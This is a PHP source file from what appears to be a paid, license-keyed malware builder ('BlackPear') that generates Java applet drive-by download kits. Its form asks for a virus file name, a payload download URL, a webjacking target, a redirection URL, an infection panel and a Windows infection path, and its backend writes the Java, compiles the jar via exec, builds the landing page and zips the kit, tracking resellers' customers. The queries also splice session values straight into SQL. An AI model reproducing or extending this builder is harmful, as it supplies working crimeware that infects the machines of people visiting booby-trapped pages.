<?php 
	set_time_limit(500);
	// Protection
	if(!$mod_login->isLogged()) header('Location: '.$_SERVER['PHP_SELF'].'?p=home'); 
	$mod_security->checkSubscription($_SESSION['username']);
?>


<script language="javascript">
function actionToDo(chaine)
{
	var a = document.getElementById("customNameJs");
	var b = document.getElementById("customLinkJs");
	var c = document.getElementById("webJackingJs");
	var d = document.getElementById("redirectionJs");
	
		if (chaine == 'view1')
		{
			a.style.display = "block";
		}
		else if (chaine == 'hide1')
		{
			a.style.display = "none";
		}
		
		if(chaine == 'view2')
			b.style.display = "block";
		else if (chaine == 'hide2')
			b.style.display = "none";
			
		if(chaine == 'view3')
			c.style.display = "block";
		else if (chaine == 'hide3')
			c.style.display = "none";	

		if(chaine == 'view4')
			d.style.display = "block";
		else if (chaine == 'hide4')
			d.style.display = "none";	
			
		if (chaine == 'generateAction')
		{
			var generateText = document.getElementById("generateRunning");
			var generateButton = document.getElementById("generateButton");
			var generateForm = document.getElementById("generateForm");
			generateText.style.display = "block";
			generateButton.disabled = "true";
			generateForm.submit();
		}
}
</script>

<div align="center">

<?php
//<span style="color: green;"/>You are now registered.<br/> Please note your license key :<br/><br/> <b style="color: red;">'.$licenseKey.'<br/><br/>(<i style="font-size: 18px;">VERY IMPORTANT</i>)</b>.
	if(!preg_match('/Chrome/i',$_SERVER['HTTP_USER_AGENT']))
	{
		print '	<a href="http://www.google.com/chrome?hl=en" target="a_blank">
					<img src="http://aux.iconpedia.net/uploads/189097942586848017.png"/>
				</a><br/>
				<b style="color: red;">You\'re browser is not HTML5 compatible. Please use Google Chrome to use the generator.</b>';
		die;
	}
	
	($mod_login->isReseller($_SESSION['username'])) ? $minToWait = 2 : $minToWait = 10;
	if(!$mod_security->checkLog($_SESSION['username'],$minToWait) && !$mod_login->isAdmin($_SESSION['username'])) die("Please wait ".$minToWait." minute between each generation.");
	// if(!$mod_login->isAdmin($_SESSION['username'])) die('<span style="color: red;">CLOSED : Sorry for the disagrement. We are under updating the generation system so the system is closed for thi s day. He come back before this night.</span>');
	if(!isset($_POST['licenseKey']) || !isset($_POST['webJacking']) || !isset($_POST['jdbSignName']) || $_POST['jdbSignName'] == "Displayed when applet run." || !isset($_POST['JdbName']) || $_POST['JdbName'] == "Name of the .jar file" || !isset($_POST['DwnlMethod']) || !isset($_POST['activeLog']) || !isset($_POST['infectionPath']))
	{
	
	$session = $_SESSION['username'];
	$query = "SELECT nbGen FROM `bpcms_users` WHERE Username='$session'";
	$request = mysql_query($query);
	$result = mysql_result($request, 0);
	
	$query2 = "SELECT licenseKey FROM `bpcms_users` WHERE Username='$session'";
	$request2 = mysql_query($query2);
	$result2 = mysql_result($request2, 0);
	
	if($result == 0)
	print "<span style=\"color: green;\"/>Is the first time you generate a drive by. Please note your license key :<br/> <b style=\"color: red;\">".$result2."<br/>(<i style=\"font-size: 18px;\">IT'S REALLY IMPORTANT</i>)</b>.";

	
	
?>
<span id="generateRunning" style="color: green; display: none;">Generation is running, please wait until is done.</span>
<form id="generateForm" method="POST" action="<?php $_SERVER['PHP_SELF']; ?>?p=generate">
<table style="margin-top: 10px;">
	<tr>
		<td>License Key :</td>
		<td><input type="text" name="licenseKey" placeholder="Your unique license Key" required="required"/></td>
	</tr>
	<?php
	if($mod_login->isReseller($_SESSION['username']))
	{
	?>
	<tr>
		<td>For :</td>
		<td><input type="text" name="sellTo" placeholder="Name of the customer" required="required"/></td>
	</tr>
	<?php
	}
	?>
	<tr></tr>
	<tr>
		<td>Name of Class :</td>
		<td><input type="text" name="jdbSignName" placeholder="Displayed when applet run." required="required"/></td>
		<td style="color: red;">Do not write numbers, special characters or space.</td>
	</tr>
	<tr></tr>
	<tr>
		<td>JDB name :</td>
		<td><input type="text" name="jarName" placeholder="Name of the .jar file" required="required"/></td>
		<td style="color: red;">Do not write numbers, special characters or space.</td>
	</tr>
	<tr></tr>
	<tr>
		<td>Name :</td>
		<td><input type="radio" name="JdbName" id="ouiCli" onchange="actionToDo('hide1')"/>Random</td>
<td><input type="radio" name="JdbName" id="nonCli" onchange="actionToDo('view1')"/>Custom</td>
		<td><input style="display: none;" type="text" id="customNameJs" name="customName" placeholder="NameOfYourVirus.exe" required="required"></td>
	</tr>
	<tr></tr>
	<tr>
		<td>Download method :</td>
		<td><input type="radio" name="DwnlMethod" onchange="actionToDo('hide2')"/>Normal</td>
<td><input type="radio" name="DwnlMethod" onchange="actionToDo('view2')"/>Custom</td>
		<td><input style="display: none;" type="text" id="customLinkJs" name="customLink" placeholder="http://yoursite.com/yourvirus.exe" required="required"></td>
	</tr>
	<tr></tr>
	<tr>
		<td>Use Webjacking :</td>
		<td><input type="radio" name="webJackingRadio" onchange="actionToDo('hide3')"/>No</td>
		<td><input type="radio" name="webJackingRadio" onchange="actionToDo('view3')"/>Yes</td>
		<td><input style="display: none;" type="text" id="webJackingJs" name="webJacking" placeholder="http://thewebsite.com" required="required"></td>
	</tr>
	<tr></tr>
	<tr>
		<td>Redirection</td>
		<td><input type="radio" name="redirectionRadio" onchange="actionToDo('hide4')"/>No</td>
		<td><input type="radio" name="redirectionRadio" onchange="actionToDo('view4')"/>Yes</td>
		<td><input style="display: none;" type="text" id="redirectionJs" name="redirection" placeholder="http://thewebsite.com" required="required"></td>
	</tr>
	<tr></tr>
	<tr>
		<td>Infection panel :</td>
		<td><select name="activeLog"/><option>Yes</option><option>No</option></select></td>
	</tr>
	<tr></tr>
	<tr>
		<td>Infection path :</td>
		<td><select name="infectionPath"><option>TEMP</option><option>WINDIR</option><option>APPDATA</option></select></td>
	</tr>
	<tr></tr>
	<tr>
		<td></td>
		<td></td>
		<td><input type="submit" onClick="actionToDo('generateAction')" id="generateButton" value="Generate"/></td>
	</tr>
</table>
</form>
<?php
	}
	else
	{
		// Detection of Name
		$generate_name = $mod_generate->genLetters(10);
		(!$_POST['customName'] OR $_POST['customName'] == null) ? $jdb = true && $jdbName = $generate_name."()" : $jdbName = htmlspecialchars(addslashes($_POST['customName']));
		if($_POST['customName'] == $jdbName)
		{
		$jdb = false;
		$jdbName = '"\\\\'.$jdbName.'"';
		}
		
		
		// Detection of download method
		if(!$_POST['customLink'] OR $_POST['customLink'] == null) 
		{
			$i = 1;
			$dwnlMethod = 'getCodeBase().toString() + "load.php"';
		} else {
			$i = 0;
			$dwnlMethod = htmlspecialchars(addslashes($_POST['customLink']));
		}
		if($_POST['customLink'] == $dwnlMethod) $dwnlMethod = '"'.$dwnlMethod.'"';
		
		//Detection of redirection link
		($_POST['redirection'] != null) 
			? $redirection = htmlspecialchars(addslashes($_POST['redirection'])) 
			: $redirection = null;
		
		
		$licenseKey = htmlspecialchars(addslashes($_POST['licenseKey']));
		$activeLog = htmlspecialchars(addslashes($_POST['activeLog']));
		$infectionPath = htmlspecialchars(addslashes($_POST['infectionPath']));
		$jdbSignName = htmlspecialchars(addslashes($_POST['jdbSignName']));
		$jarName = htmlspecialchars(addslashes($_POST['jarName']));
		$webJacking = htmlspecialchars(addslashes($_POST['webJacking']));
		
		$user = $_SESSION['username'];
		
		if($mod_login->isReseller($_SESSION['username']))
			$forCustomer = htmlspecialchars(addslashes($_POST['sellTo']));
		else
			$forCustomer = null;
		
		if ($webJacking == NULL) $webJacking = "no";
		
		// Detection of hacking attempt
		if($activeLog != "Yes" && $activeLog != "No") die("What are you expect ? BlackPear know security dumbass.");
		if($infectionPath != "WINDIR" && $infectionPath != "TEMP" && $infectionPath != "APPDATA") die("What are you expect ? BlackPear know security dumbass.");
	
		// Check the license key
		print '<span style="color: yellow;">Checking license key... ';
		if(!$mod_login->checkLicenseKey($_SESSION['username'],$licenseKey)):
			die('abort</span>. <span style="color: red;">Wrong license key. Please contact us.</span>');
		else:
			$mod_security->setTime($_SESSION['username']);
			print 'done.</span>';
		endif;
		
		// Add + 1 at nbGene
		
		$session = $_SESSION['username'];
		$test = "UPDATE bpcms_users SET nbGen = nbGen + 1 WHERE Username = '$session'";
		
		mysql_query($test);
		
		// Declaration of the Static name of the Connexion file
		$connName = $mod_generate->genLetters(10);
	
		// Generate the .JAVA
		$genSerial = $mod_jdb->createJava($redirection,$jdbSignName,$activeLog,$infectionPath,$dwnlMethod,$jdbName,$connName,$jarName,$jdb);
		print '<br/><span style="color: green;">Generate java file... ';
		
		// Generate the .BAT
		$batch = $mod_jdb->createBat($jarName,$connName,$jdbSignName);
		print 'done.<br/>Generate the bat file...';
		
		// Create the .JAR
		print 'done.<br/>Compile the jar...';
		exec('start '.$batch);
		
		// Create the .PHP
		print 'done.<br/>Create the .PHP...';
		$mod_jdb->createHtml($jarName,$jdbSignName,$webJacking);
		
		// Create the .ZIP
		print 'done.<br/>Generate the zip archive...';
		$zipName = $mod_jdb->createZip($i,$jarName,$activeLog);
		
		// Add the serial key
		$creationDate = date('d-m-Y');
		mysql_query("INSERT INTO jdb_serials VALUES('', '$genSerial', '$creationDate', '', '$user', '', '', '', '$forCustomer', '1')");
		
		print 'done.<br/>Download <a href="ls/zip/'.$zipName.'">here</a>.</span>';
	}
	
	

?>
</div>